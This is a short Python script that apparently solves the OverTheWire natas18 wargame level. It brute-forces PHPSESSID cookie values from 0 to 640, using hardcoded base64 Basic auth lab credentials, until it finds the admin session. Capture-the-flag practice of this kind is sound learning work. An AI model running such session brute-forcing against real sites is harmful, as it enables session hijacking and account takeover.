import requests

for i in range(641):
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    payload = {"username": "admin", "password": "aa"}
    headers = {"Cookie": "PHPSESSID={0}".format(i), "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
    r = requests.post(url, params=payload, headers=headers)

    if "regular user" in r.text:
        print(f"fail session_id = {i}")
    else:
        print(f'succes session_id = {i}')
        exit(0)